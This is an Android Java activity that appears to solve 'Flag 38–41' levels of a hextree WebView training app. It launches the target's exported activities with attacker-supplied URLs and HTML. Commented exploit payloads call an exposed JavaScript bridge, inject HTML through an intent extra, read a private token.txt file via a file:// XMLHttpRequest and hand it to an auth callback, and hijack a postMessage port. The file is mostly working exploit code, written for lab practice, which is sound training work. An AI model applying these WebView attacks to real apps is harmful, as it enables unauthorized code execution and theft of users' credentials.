package com.example.evilcorp;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class WebviewsActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_webviews);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        // back button]

        Button btnToMain = findViewById(R.id.backButtonFromWebview);
        btnToMain.setOnClickListener(v -> {
            Intent intent = new Intent(WebviewsActivity.this, MainActivity.class);
            startActivity(intent);
        });




        //Flag 38 Activity Code....  a user controlled URL string leading to the exploitation of exposed webview functions.
            // host an HTML file on a hosting service and provide the link... or use NGROK to expose your localhost server online.
        /*

    <!DOCTYPE html>
    <html lang="en">
    <head>
    <title>Flag 38 Exploit</title>
    </head>
    <body>
    <h1>Hello world!!!!!!</h1>
    <h3>Flag 38 exploit</h3>
    <p>Test paragraph</p>
    <button onclick="document.write(window.hextree.success(true));">Click Me</button>

    </body>
    </html>

* */


        Button flag38Button = findViewById(R.id.flag38Button);
        flag38Button.setOnClickListener(v -> {
            String uri = "https://ngrok_URL/hextree_flag38.html";
            Intent intent = new Intent();
            intent.putExtra("URL",uri);
            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
            startActivity(intent);
        });



        // Flag 39
        Button flag39Button = findViewById(R.id.flag39Button);
        flag39Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.putExtra("NAME","<button onclick=\"hextree.success()\">do not click me</button>");
            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
            startActivity(intent);
        });


        // Flag 40
        /* Exploit code for flag 40
        move to /data/local/tmp folder and give the X permission

    <script>
    onload = () => {
    let x = new XMLHttpRequest();
    x.onload = () => hextree.authCallback(x.responseText.trim());
    x.open("GET", "file:///data/data/io.hextree.attacksurface/files/token.txt");
    x.send();
    };
    </script>

        * */

        Button flag40Button = findViewById(R.id.flag40Button);
        flag40Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.putExtra("URL", "file:///data/local/tmp/hextree_flag40.html");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag40WebViewsActivity");
            startActivity(intent);
        });


        // Flag 41 => Using a hosted HTML file
        /* Exploit code for flag 41
        this exploit code can be hosted on windows Localhost and reached via the IP 10.0.2.2 (AVD) or 10.0.2.3 (Genymotion)

    <!DOCTYPE html>
    <html lang="en">
    <head>
    <title>Flag 41 Exploit</title>
    </head>
    <body>
    <h3>Flag41 exploit</h3>
    <script>
    window.addEventListener("message", function (event) {
    if (!event.ports || event.ports.length === 0) return;
    const port = event.ports[0];
    port.onmessage = function(e) {
    console.log("[app->web]", e.data);
    };

    port.postMessage(JSON.stringify({ message: "init_complete" }));

    setTimeout(() => {
    port.postMessage(JSON.stringify({ message: "success" }));
    }, 1000);
    });
    </script>
    </body>
    </html>



        */




        Button flag41Button = findViewById(R.id.flag41Button);
        flag41Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.putExtra("URL", "http://10.0.2.2:1234/hextree_flag40.html");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity");
            startActivity(intent);
        });
    }
}